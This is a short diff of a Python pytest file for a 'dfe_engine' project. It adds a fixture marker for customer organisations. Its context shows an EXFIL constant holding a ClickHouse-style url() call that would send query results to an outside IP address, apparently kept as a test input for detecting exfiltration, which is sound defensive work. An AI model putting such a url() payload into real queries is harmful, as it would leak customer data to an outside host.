@@ -19,6 +19,8 @@ import pytest
 
 from dfe_engine.yaml_utils import yaml_load
 
+pytestmark = pytest.mark.usefixtures("customer_orgs")
+
 EXFIL = "url('http://203.0.113.9/x', 'JSONEachRow')"
 
 _HUNT = {
